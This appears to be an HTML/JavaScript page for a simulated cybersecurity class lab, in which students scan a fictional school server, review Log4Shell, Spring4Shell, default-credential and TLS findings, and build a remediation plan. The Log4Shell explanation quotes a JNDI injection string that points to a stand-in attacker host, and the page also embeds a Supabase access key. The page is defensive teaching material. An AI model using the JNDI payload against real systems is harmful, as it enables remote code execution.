@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberPath: Module 3 — What's Broken?</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap');
+  :root { --bg:#0a0e1a; --panel:#111827; --panel2:#1a2235; --border:#1e2d45; --accent:#00d4ff; --accent2:#7c3aed; --green:#10b981; --yellow:#f59e0b; --red:#ef4444; --text:#e2e8f0; --muted:#64748b; --mono:'JetBrains Mono',monospace; --sans:'Inter',sans-serif; }
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { background:var(--bg); color:var(--text); font-family:var(--sans); min-height:100vh; display:flex; flex-direction:column; }
+  nav { background:var(--panel); border-bottom:1px solid var(--border); padding:0 24px; height:56px; display:flex; align-items:center; justify-content:space-between; flex-shrink:0; }
+  .nav-logo { font-family:var(--mono); font-weight:700; font-size:16px; color:var(--accent); letter-spacing:.05em; }
+  .nav-logo span { color:var(--text); }
+  .nav-meta { display:flex; align-items:center; gap:20px; font-size:13px; color:var(--muted); }
+  .badge { background:var(--accent2); color:#fff; font-size:11px; font-weight:600; padding:2px 8px; border-radius:99px; }
+  .progress-bar-wrap { width:120px; height:6px; background:var(--border); border-radius:99px; overflow:hidden; }
+  .progress-bar-fill { height:100%; background:linear-gradient(90deg,var(--accent),var(--accent2)); border-radius:99px; transition:width .5s ease; width:0%; }
+  .layout { display:grid; grid-template-columns:300px 1fr 260px; flex:1; overflow:hidden; height:calc(100vh - 56px); }
+  .sidebar { background:var(--panel); border-right:1px solid var(--border); display:flex; flex-direction:column; overflow-y:auto; }
+  .sidebar-section { padding:20px; border-bottom:1px solid var(--border); }
+  .sidebar-label { font-size:10px; font-weight:700; letter-spacing:.12em; color:var(--muted); text-transform:uppercase; margin-bottom:10px; }
+  .scenario-title { font-size:15px; font-weight:700; color:var(--accent); margin-bottom:8px; }
+  .scenario-text { font-size:13px; color:#94a3b8; line-height:1.6; }
+  .scenario-text strong { color:var(--text); }
+  .obj-list { list-style:none; }
+  .obj-item { display:flex; align-items:flex-start; gap:10px; padding:8px 0; font-size:13px; color:#94a3b8; border-bottom:1px solid var(--border); transition:color .3s; }
+  .obj-item:last-child { border-bottom:none; }
+  .obj-item.done { color:var(--green); }
+  .obj-check { width:18px; height:18px; border:2px solid var(--border); border-radius:4px; display:flex; align-items:center; justify-content:center; flex-shrink:0; margin-top:1px; transition:all .3s; font-size:11px; }
+  .obj-item.done .obj-check { background:var(--green); border-color:var(--green); color:#fff; }
+  .vuln-list { display:flex; flex-direction:column; gap:6px; }
+  .vuln-chip { background:var(--bg); border-radius:6px; padding:8px 10px; font-size:11px; border-left:3px solid var(--border); opacity:.4; transition:opacity .3s; }
+  .vuln-chip.found { opacity:1; }
+  .vuln-chip.critical { border-color:var(--red); }
+  .vuln-chip.high { border-color:var(--yellow); }
+  .vuln-chip.medium { border-color:var(--accent); }
+  .vuln-chip-title { font-family:var(--mono); color:var(--text); margin-bottom:2px; }
+  .vuln-chip-sev { font-size:10px; }
+  .vuln-chip.critical .vuln-chip-sev { color:var(--red); }
+  .vuln-chip.high .vuln-chip-sev { color:var(--yellow); }
+  .vuln-chip.medium .vuln-chip-sev { color:var(--accent); }
+  .hint-btn { width:100%; background:transparent; border:1px solid var(--border); color:var(--yellow); font-family:var(--mono); font-size:12px; padding:8px 12px; border-radius:6px; cursor:pointer; text-align:left; transition:all .2s; }
+  .hint-btn:hover { background:rgba(245,158,11,.08); border-color:var(--yellow); }
+  .hint-text { margin-top:10px; font-size:12px; color:#fbbf24; background:rgba(245,158,11,.06); border:1px solid rgba(245,158,11,.2); border-radius:6px; padding:10px; line-height:1.6; display:none; }
+  .hint-text.visible { display:block; }
+  .terminal-wrap { display:flex; flex-direction:column; overflow:hidden; }
+  .terminal-header { background:var(--panel2); border-bottom:1px solid var(--border); padding:10px 18px; display:flex; align-items:center; gap:10px; flex-shrink:0; }
+  .terminal-dots { display:flex; gap:6px; }
+  .dot { width:12px; height:12px; border-radius:50%; }
+  .dot.red{background:#ff5f56} .dot.yellow{background:#ffbd2e} .dot.green{background:#27c93f}
+  .terminal-title { font-family:var(--mono); font-size:12px; color:var(--muted); margin-left:4px; }
+  .terminal-output { flex:1; overflow-y:auto; padding:18px 20px; font-family:var(--mono); font-size:13px; line-height:1.7; }
+  .terminal-output::-webkit-scrollbar { width:6px; }
+  .terminal-output::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
+  .t-line { margin-bottom:2px; }
+  .t-prompt{color:var(--accent)} .t-cmd{color:var(--text)}
+  .t-out{color:#94a3b8;white-space:pre}
+  .t-out.highlight{color:var(--green)} .t-out.warn{color:var(--yellow)} .t-out.error{color:var(--red)} .t-out.accent{color:var(--accent)}
+  .t-system{color:var(--accent2);font-size:12px;padding:6px 0;border-left:2px solid var(--accent2);padding-left:10px;margin:6px 0}
+  .t-info{color:var(--accent);background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.15);border-radius:6px;padding:10px 14px;margin:8px 0;line-height:1.6;font-family:var(--sans);font-size:13px}
+  .t-info strong{font-family:var(--mono);color:var(--text)}
+  .terminal-input-row{display:flex;align-items:center;padding:12px 20px;border-top:1px solid var(--border);background:var(--panel2);gap:8px;flex-shrink:0}
+  .terminal-prompt-label{font-family:var(--mono);font-size:13px;color:var(--accent);white-space:nowrap}
+  .terminal-input{flex:1;background:transparent;border:none;outline:none;color:var(--text);font-family:var(--mono);font-size:13px;caret-color:var(--accent)}
+  .run-btn{background:var(--accent);color:var(--bg);border:none;font-family:var(--mono);font-size:12px;font-weight:700;padding:6px 14px;border-radius:5px;cursor:pointer}
+  .assistant-panel{background:var(--panel);border-left:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
+  .assistant-header{padding:16px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-shrink:0}
+  .assistant-avatar{width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0}
+  .assistant-name{font-size:14px;font-weight:600;color:var(--text)}
+  .assistant-role{font-size:11px;color:var(--muted)}
+  .online-dot{width:7px;height:7px;background:var(--green);border-radius:50%;margin-left:auto;box-shadow:0 0 6px var(--green)}
+  .assistant-messages{flex:1;overflow-y:auto;padding:14px;display:flex;flex-direction:column;gap:10px}
+  .msg{background:var(--panel2);border:1px solid var(--border);border-radius:10px;padding:10px 12px;font-size:13px;color:#94a3b8;line-height:1.6;animation:fadeUp .3s ease}
+  .msg strong{color:var(--text)}
+  .msg code{background:rgba(0,212,255,.1);color:var(--accent);font-family:var(--mono);font-size:11px;padding:1px 5px;border-radius:3px}
+  .msg.celebrate{border-color:rgba(16,185,129,.3);background:rgba(16,185,129,.06);color:var(--green)}
+  @keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+  .tools-ref{padding:14px;border-top:1px solid var(--border);flex-shrink:0}
+  .tools-label{font-size:10px;font-weight:700;letter-spacing:.1em;color:var(--muted);text-transform:uppercase;margin-bottom:8px}
+  .tool-chip{display:inline-block;background:var(--panel2);border:1px solid var(--border);color:var(--accent);font-family:var(--mono);font-size:11px;padding:3px 8px;border-radius:4px;margin:3px 3px 3px 0;cursor:pointer;transition:all .2s}
+  .tool-chip:hover{background:rgba(0,212,255,.08);border-color:var(--accent)}
+  .celebration{display:none;position:fixed;inset:0;background:rgba(10,14,26,.88);z-index:100;align-items:center;justify-content:center;flex-direction:column;text-align:center;gap:16px}
+  .celebration.show{display:flex}
+  .cele-icon{font-size:64px}
+  .cele-title{font-size:28px;font-weight:700;color:var(--accent);font-family:var(--mono)}
+  .cele-sub{font-size:15px;color:#94a3b8;max-width:360px;line-height:1.6}
+  .cele-btn{background:var(--green);color:#fff;border:none;font-family:var(--mono);font-size:14px;font-weight:700;padding:12px 32px;border-radius:8px;cursor:pointer;margin-top:8px}
+  .cele-btn2{background:var(--accent2);color:#fff;border:none;font-family:var(--mono);font-size:14px;font-weight:700;padding:12px 32px;border-radius:8px;cursor:pointer;margin-top:8px}
+  .join-modal{position:fixed;inset:0;background:rgba(10,14,26,.95);z-index:200;display:flex;align-items:center;justify-content:center}
+  .join-box{background:var(--panel);border:1px solid var(--border);border-radius:16px;padding:40px;text-align:center;max-width:400px;width:100%}
+  .join-title{font-size:22px;font-weight:700;color:var(--accent);font-family:var(--mono);margin-bottom:8px}
+  .join-sub{font-size:13px;color:var(--muted);margin-bottom:24px;line-height:1.6}
+  .join-input{width:100%;background:var(--panel2);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:16px;padding:12px;border-radius:8px;text-align:center;outline:none;margin-bottom:10px;letter-spacing:.1em}
+  .join-input:focus{border-color:var(--accent)}
+  .join-name{width:100%;background:var(--panel2);border:1px solid var(--border);color:var(--text);font-family:var(--sans);font-size:14px;padding:12px;border-radius:8px;text-align:center;outline:none;margin-bottom:16px}
+  .join-name:focus{border-color:var(--accent)}
+  .join-btn{width:100%;background:var(--accent);color:var(--bg);border:none;font-family:var(--mono);font-size:14px;font-weight:700;padding:12px;border-radius:8px;cursor:pointer}
+  .join-skip{font-size:12px;color:var(--muted);margin-top:12px;cursor:pointer;text-decoration:underline}
+  /* scan progress bar */
+  .scan-progress{background:var(--panel2);border:1px solid var(--border);border-radius:8px;padding:12px;margin:8px 0;font-family:var(--mono);font-size:12px}
+  .scan-bar-wrap{height:8px;background:var(--border);border-radius:99px;overflow:hidden;margin:8px 0}
+  .scan-bar-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--green));border-radius:99px;width:0%;transition:width .1s}
+</style>
+</head>
+<body>
+
+<div class="join-modal" id="joinModal">
+  <div class="join-box">
+    <div class="join-title">Module 3</div>
+    <div style="font-size:32px;margin:12px 0">🔬</div>
+    <div class="join-sub">Enter your class code and name to join your instructor's session.</div>
+    <input class="join-input" id="joinCode" placeholder="CLASS CODE" maxlength="6"/>
+    <input class="join-name" id="joinName" placeholder="Your first name" maxlength="30"/>
+    <button class="join-btn" onclick="joinSession()">Join Session →</button>
+    <div class="join-skip" onclick="skipJoin()">Skip — work solo</div>
+  </div>
+</div>
+
+<nav>
+  <div class="nav-logo">CYBER<span>PATH</span></div>
+  <div class="nav-meta">
+    <span class="badge">Module 3 of 6</span>
+    <span>What's Broken?</span>
+    <div style="display:flex;align-items:center;gap:8px;">
+      <span style="font-size:11px;">Progress</span>
+      <div class="progress-bar-wrap"><div class="progress-bar-fill" id="progressBar"></div></div>
+    </div>
+  </div>
+</nav>
+
+<div class="layout">
+  <aside class="sidebar">
+    <div class="sidebar-section">
+      <div class="sidebar-label">Mission Brief</div>
+      <div class="scenario-title">🔬 Vulnerability Assessment</div>
+      <div class="scenario-text">
+        The school has a public-facing web server at <strong>192.168.10.50</strong> that hosts the student portal. The IT manager suspects it hasn't been patched in months.<br><br>
+        Your job: run a full vulnerability scan, classify what you find, and create a remediation plan.
+      </div>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-label">Objectives</div>
+      <ul class="obj-list" id="objList">
+        <li class="obj-item" id="obj1"><div class="obj-check">1</div><span>Run a basic vulnerability scan</span></li>
+        <li class="obj-item" id="obj2"><div class="obj-check">2</div><span>Identify the critical vulnerabilities</span></li>
+        <li class="obj-item" id="obj3"><div class="obj-check">3</div><span>Check for default credentials</span></li>
+        <li class="obj-item" id="obj4"><div class="obj-check">4</div><span>Create a remediation plan</span></li>
+      </ul>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-label">Vulnerabilities Found</div>
+      <div class="vuln-list" id="vulnList">
+        <div class="vuln-chip critical" id="v1"><div class="vuln-chip-title">CVE-2021-44228</div><div class="vuln-chip-sev">CRITICAL — Log4Shell</div></div>
+        <div class="vuln-chip high" id="v2"><div class="vuln-chip-title">CVE-2022-22965</div><div class="vuln-chip-sev">HIGH — Spring4Shell</div></div>
+        <div class="vuln-chip high" id="v3"><div class="vuln-chip-title">Default Credentials</div><div class="vuln-chip-sev">HIGH — admin/admin</div></div>
+        <div class="vuln-chip medium" id="v4"><div class="vuln-chip-title">TLS 1.0 Enabled</div><div class="vuln-chip-sev">MEDIUM — Outdated encryption</div></div>
+      </div>
+    </div>
+    <div class="sidebar-section">
+      <div class="sidebar-label">Need a nudge?</div>
+      <button class="hint-btn" onclick="toggleHint()">💡 Show hint</button>
+      <div class="hint-text" id="hintBox">Start with <code>nessus scan 192.168.10.50</code> to run a full vulnerability scan, then use <code>nessus detail CVE-2021-44228</code> to dig into specific findings.</div>
+    </div>
+  </aside>
+
+  <div class="terminal-wrap">
+    <div class="terminal-header">
+      <div class="terminal-dots"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+      <span class="terminal-title">analyst@cyberpath:~$ — Nessus Vulnerability Scanner</span>
+    </div>
+    <div class="terminal-output" id="termOut">
+      <div class="t-line t-system">CyberPath Secure Lab — Module 3: Vulnerability Management</div>
+      <div class="t-line t-system">Nessus Professional v10.5 — Simulated environment</div>
+      <div class="t-info">🔬 Target: <strong>192.168.10.50</strong> (School Student Portal). Run <strong>nessus scan 192.168.10.50</strong> to start your vulnerability assessment.</div>
+    </div>
+    <div class="terminal-input-row">
+      <span class="terminal-prompt-label">analyst@cyberpath:~$</span>
+      <input class="terminal-input" id="cmdInput" type="text" placeholder="type a command..." autocomplete="off" spellcheck="false"/>
+      <button class="run-btn" onclick="runCommand()">RUN ↵</button>
+    </div>
+  </div>
+
+  <div class="assistant-panel">
+    <div class="assistant-header">
+      <div class="assistant-avatar">🤖</div>
+      <div><div class="assistant-name">ARIA</div><div class="assistant-role">AI Security Guide</div></div>
+      <div class="online-dot"></div>
+    </div>
+    <div class="assistant-messages" id="assistantMsgs">
+      <div class="msg">Welcome to <strong>Module 3</strong>! Today we're doing <strong>vulnerability scanning</strong> — systematically checking a system for known weaknesses before attackers find them. 🔬</div>
+      <div class="msg">We're using <strong>Nessus</strong>, the industry-standard vulnerability scanner. It checks thousands of known CVEs (Common Vulnerabilities and Exposures) automatically. Start with <code>nessus scan 192.168.10.50</code>.</div>
+    </div>
+    <div class="tools-ref">
+      <div class="tools-label">Quick commands</div>
+      <span class="tool-chip" onclick="insertCmd('nessus scan 192.168.10.50')">nessus scan</span>
+      <span class="tool-chip" onclick="insertCmd('nessus detail CVE-2021-44228')">nessus detail</span>
+      <span class="tool-chip" onclick="insertCmd('credcheck 192.168.10.50')">credcheck</span>
+      <span class="tool-chip" onclick="insertCmd('remediate 192.168.10.50')">remediate</span>
+      <span class="tool-chip" onclick="insertCmd('help')">help</span>
+    </div>
+  </div>
+</div>
+
+<div class="celebration" id="celebration">
+  <div class="cele-icon">🛡️</div>
+  <div class="cele-title">Vulnerabilities Patched!</div>
+  <div class="cele-sub">You found Log4Shell, Spring4Shell, default credentials and weak encryption — then built a remediation plan to fix them all.<br><br><strong style="color:#10b981;">Skill unlocked: Vulnerability Management</strong></div>
+  <button class="cele-btn" onclick="window.location.href='module4_cyber_lab.html'">Next: Module 4 →</button>
+  <button class="cele-btn2" onclick="resetLab()">Replay Module 3</button>
+</div>
+
+<script>
+const SUPABASE_URL='https://mlgxqrpxftviqyfhosl.supabase.co';
+const SUPABASE_KEY='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1sZ3hxcnhweGZ0dmlxeWZob3NsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI1ODgyNzEsImV4cCI6MjA5ODE2NDI3MX0.wkmgVfohm8Qzfi_XNdz1vdXavsUOvMPcoZ6MVPMewD4';
+const HEADERS={'Content-Type':'application/json','apikey':SUPABASE_KEY,'Authorization':`Bearer ${SUPABASE_KEY}`};
+const state={objectives:{1:false,2:false,3:false,4:false},sessionId:null,studentName:null,history:[],historyIdx:-1,scanDone:false};
+
+function joinSession(){const code=document.getElementById('joinCode').value.trim().toUpperCase();const name=document.getElementById('joinName').value.trim();if(!name){alert('Please enter your name!');return;}state.sessionId=code||null;state.studentName=name;document.getElementById('joinModal').style.display='none';if(code)syncProgress();}
+function skipJoin(){state.studentName='Solo Student';document.getElementById('joinModal').style.display='none';}
+async function syncProgress(){if(!state.sessionId||!state.studentName)return;const objs=Object.values(state.objectives);const lastCmd=state.history[0]||'';try{const checkRes=await fetch(`${SUPABASE_URL}/rest/v1/student_progress?session_id=eq.${state.sessionId}&student_name=eq.${encodeURIComponent(state.studentName)}&module=eq.3`,{headers:HEADERS});const existing=await checkRes.json();if(existing.length>0){await fetch(`${SUPABASE_URL}/rest/v1/student_progress?id=eq.${existing[0].id}`,{method:'PATCH',headers:HEADERS,body:JSON.stringify({objectives:objs,last_cmd:lastCmd,updated_at:new Date().toISOString()})});}else{await fetch(`${SUPABASE_URL}/rest/v1/student_progress`,{method:'POST',headers:{...HEADERS,'Prefer':'return=minimal'},body:JSON.stringify({session_id:state.sessionId,student_name:state.studentName,module:3,objectives:objs,last_cmd:lastCmd});});}}catch(e){console.warn('Sync error',e);}}
+const out=document.getElementById('termOut');
+function print(html,cls='t-out'){const d=document.createElement('div');d.className=`t-line ${cls}`;d.innerHTML=html;out.appendChild(d);out.scrollTop=out.scrollHeight;}
+function printCmd(cmd){print(`<span class="t-prompt">analyst@cyberpath:~$</span> <span class="t-cmd">${esc(cmd)}</span>`);}
+function printBlank(){const d=document.createElement('div');d.style.height='6px';out.appendChild(d);}
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function aria(html){const b=document.getElementById('assistantMsgs');const d=document.createElement('div');d.className='msg';d.innerHTML=html;b.appendChild(d);b.scrollTop=b.scrollHeight;}
+function ariaSuccess(html){const b=document.getElementById('assistantMsgs');const d=document.createElement('div');d.className='msg celebrate';d.innerHTML=html;b.appendChild(d);b.scrollTop=b.scrollHeight;}
+function completeObj(n){if(state.objectives[n])return;state.objectives[n]=true;const el=document.getElementById('obj'+n);el.classList.add('done');el.querySelector('.obj-check').textContent='✓';const done=Object.values(state.objectives).filter(Boolean).length;document.getElementById('progressBar').style.width=(done/4*100)+'%';syncProgress();if(done===4)setTimeout(()=>document.getElementById('celebration').classList.add('show'),1200);}
+function revealVuln(id){document.getElementById(id).classList.add('found');}
+
+function animateScan(cb){
+  const div=document.createElement('div');div.className='scan-progress';
+  div.innerHTML=`<div style="color:var(--accent);margin-bottom:4px">Nessus scan in progress...</div><div class="scan-bar-wrap"><div class="scan-bar-fill" id="scanFill"></div></div><div id="scanStatus" style="color:var(--muted);font-size:11px">Initialising...</div>`;
+  out.appendChild(div);out.scrollTop=out.scrollHeight;
+  const steps=['Checking 45,000 plugins...','Testing web application...','Checking for CVEs...','Testing credentials...','Analysing SSL/TLS...','Compiling results...'];
+  let i=0;let pct=0;
+  const iv=setInterval(()=>{
+    pct=Math.min(100,pct+(Math.random()*18+5));
+    document.getElementById('scanFill').style.width=pct+'%';
+    document.getElementById('scanStatus').textContent=steps[Math.min(i,steps.length-1)];
+    i++;
+    if(pct>=100){clearInterval(iv);document.getElementById('scanStatus').textContent='Scan complete!';setTimeout(cb,600);}
+  },400);
+}
+
+const RESPONSES={
+  'help':()=>{
+    print('Available commands:','t-out accent');
+    print('  nessus scan &lt;ip&gt;         — run full vulnerability scan');
+    print('  nessus detail &lt;CVE-ID&gt;    — get details on a specific CVE');
+    print('  credcheck &lt;ip&gt;            — test for default credentials');
+    print('  remediate &lt;ip&gt;            — generate remediation plan');
+    printBlank();
+    aria('Start with <code>nessus scan 192.168.10.50</code> to find all vulnerabilities on the target!');
+  },
+  'nessus scan 192.168.10.50':()=>{
+    if(state.scanDone){print('Scan already completed. Use nessus detail or credcheck to investigate findings.','t-out warn');return;}
+    state.scanDone=true;
+    printBlank();
+    animateScan(()=>{
+      printBlank();
+      print('NESSUS SCAN RESULTS — 192.168.10.50');
+      print('════════════════════════════════════════');
+      print('');
+      print('CRITICAL (1):');
+      print('  ■ CVE-2021-44228  Log4Shell RCE          CVSS: 10.0','t-out error');
+      print('');
+      print('HIGH (2):');
+      print('  ■ CVE-2022-22965  Spring4Shell RCE        CVSS: 9.8','t-out warn');
+      print('  ■ Default credentials detected            CVSS: 9.1','t-out warn');
+      print('');
+      print('MEDIUM (1):');
+      print('  ■ TLS 1.0 enabled (deprecated protocol)  CVSS: 5.3','t-out accent');
+      print('');
+      print('Total: 4 vulnerabilities | 1 Critical | 2 High | 1 Medium','t-out highlight');
+      printBlank();
+      revealVuln('v1');revealVuln('v2');revealVuln('v4');
+      completeObj(1);
+      print('[ Objective 1 complete: Vulnerability scan finished ]','t-out highlight');
+      aria('<strong>4 vulnerabilities found!</strong> The most critical is <strong>Log4Shell (CVE-2021-44228)</strong> — one of the worst vulnerabilities ever discovered. It affects millions of systems and allows attackers to execute code remotely just by sending a specially crafted log message. Use <code>nessus detail CVE-2021-44228</code> to learn more, then <code>credcheck 192.168.10.50</code> to investigate the default credentials finding.');
+    });
+  },
+  'nessus detail cve-2021-44228':()=>RESPONSES['nessus detail CVE-2021-44228'](),
+  'nessus detail CVE-2021-44228':()=>{
+    print('');
+    print('CVE DETAIL: CVE-2021-44228 (Log4Shell)');
+    print('══════════════════════════════════════');
+    print('Severity:    CRITICAL (CVSS 10.0 — maximum possible)','t-out error');
+    print('Affected:    Apache Log4j 2.0-beta9 to 2.14.1');
+    print('Component:   Java logging library (Log4j)');
+    print('');
+    print('Description:');
+    print('  Attacker sends a malicious string: ${jndi:ldap://evil.com/x}');
+    print('  Log4j logs the string and triggers a remote code fetch.','t-out error');
+    print('  Result: full remote code execution on the server.','t-out error');
+    print('');
+    print('Fix: Upgrade Log4j to version 2.17.1 or later.','t-out highlight');
+    print('Patch available: YES  |  Exploit public: YES (extremely active)','t-out error');
+    printBlank();
+    completeObj(2);
+    print('[ Objective 2 complete: Critical vulnerability understood ]','t-out highlight');
+    aria('Log4Shell was discovered in December 2021 and sent the entire security industry into a panic. Hundreds of millions of devices were vulnerable. The fact that this server has it means <strong>it could be fully compromised right now</strong>. This needs patching immediately. Next, check for default credentials with <code>credcheck 192.168.10.50</code>.');
+  },
+  'credcheck 192.168.10.50':()=>{
+    print('');
+    print('Credential Check: 192.168.10.50');
+    print('Testing common default username/password combinations...');
+    print('');
+    print('admin / admin        → LOGIN SUCCESSFUL ✗','t-out error');
+    print('admin / password     → Failed');
+    print('root  / root         → Failed');
+    print('admin / 1234         → Failed');
+    print('');
+    print('RESULT: Default credentials active on admin panel!','t-out error');
+    print('Admin panel URL: http://192.168.10.50:8080/admin','t-out warn');
+    printBlank();
+    revealVuln('v3');
+    completeObj(3);
+    print('[ Objective 3 complete: Default credentials confirmed ]','t-out highlight');
+    aria('🚨 <strong>admin/admin still works!</strong> This is one of the most common mistakes in IT — default credentials are never changed after setup. Anyone who knows the admin panel URL can log straight in. Combined with Log4Shell, this server is completely exposed. Now build your remediation plan with <code>remediate 192.168.10.50</code>.');
+  },
+  'remediate 192.168.10.50':()=>{
+    print('');
+    print('REMEDIATION PLAN — 192.168.10.50','t-out accent');
+    print('Generated: '+new Date().toLocaleString());
+    print('');
+    print('PRIORITY 1 — IMMEDIATE (within 24 hours):','t-out error');
+    print('  1. Patch Log4j to v2.17.1 (CVE-2021-44228)');
+    print('     Command: apt upgrade liblog4j2-java');
+    print('  2. Change admin password (min 16 chars, random)');
+    print('     Current: admin/admin → UNACCEPTABLE');
+    print('');
+    print('PRIORITY 2 — THIS WEEK:','t-out warn');
+    print('  3. Patch Spring framework (CVE-2022-22965)');
+    print('     Update to Spring 5.3.18+ or 5.2.20+');
+    print('  4. Disable TLS 1.0, enable TLS 1.3 only');
+    print('');
+    print('PRIORITY 3 — THIS MONTH:','t-out accent');
+    print('  5. Implement vulnerability scanning schedule (weekly)');
+    print('  6. Set up patch management process');
+    print('  7. Enable web application firewall (WAF)');
+    print('');
+    print('Estimated fix time: 2-4 hours for Priority 1','t-out highlight');
+    print('Risk if unpatched: CRITICAL — remote code execution possible','t-out error');
+    printBlank();
+    completeObj(4);
+    ariaSuccess('🎉 <strong>Outstanding work!</strong> You ran a professional vulnerability assessment, understood one of the most critical CVEs in history, confirmed default credentials, and produced a prioritised remediation plan. That\'s exactly what a real vulnerability analyst does!');
+  }
+};
+
+function matchCmd(raw){
+  const cmd=raw.trim().toLowerCase().replace(/\s+/g,' ');
+  if(RESPONSES[cmd])return RESPONSES[cmd];
+  if(RESPONSES[raw.trim()])return RESPONSES[raw.trim()];
+  if(cmd.includes('nessus')&&cmd.includes('scan')&&cmd.includes('50'))return RESPONSES['nessus scan 192.168.10.50'];
+  if(cmd.includes('nessus')&&cmd.includes('detail')&&cmd.includes('44228'))return RESPONSES['nessus detail CVE-2021-44228'];
+  if(cmd.includes('nessus')&&cmd.includes('scan'))return ()=>{print('Usage: nessus scan 192.168.10.50','t-out warn');};
+  if(cmd.includes('credcheck')&&cmd.includes('50'))return RESPONSES['credcheck 192.168.10.50'];
+  if(cmd.includes('remediat')&&cmd.includes('50'))return RESPONSES['remediate 192.168.10.50'];
+  if(cmd==='clear')return()=>{out.innerHTML='';print('[ Terminal cleared ]','t-out accent');};
+  return null;
+}
+
+function runCommand(){
+  const input=document.getElementById('cmdInput');const raw=input.value.trim();if(!raw)return;
+  state.history.unshift(raw);state.historyIdx=-1;
+  printCmd(raw);printBlank();
+  const fn=matchCmd(raw);
+  if(fn){fn();}else{print(`bash: ${esc(raw)}: command not found`,'t-out error');aria(`I don't recognise <code>${esc(raw)}</code>. Type <code>help</code> to see available commands.`);}
+  printBlank();input.value='';out.scrollTop=out.scrollHeight;
+}
+
+document.getElementById('cmdInput').addEventListener('keydown',e=>{
+  if(e.key==='Enter'){runCommand();return;}
+  if(e.key==='ArrowUp'){e.preventDefault();if(state.historyIdx<state.history.length-1){state.historyIdx++;document.getElementById('cmdInput').value=state.history[state.historyIdx];}}
+  if(e.key==='ArrowDown'){e.preventDefault();if(state.historyIdx>0){state.historyIdx--;document.getElementById('cmdInput').value=state.history[state.historyIdx];}else{state.historyIdx=-1;document.getElementById('cmdInput').value='';}}
+});
+
+function insertCmd(cmd){document.getElementById('cmdInput').value=cmd;document.getElementById('cmdInput').focus();}
+function toggleHint(){document.getElementById('hintBox').classList.toggle('visible');}
+function resetLab(){location.reload();}
+document.getElementById('cmdInput').focus();
+</script>
+</body>
+</html>
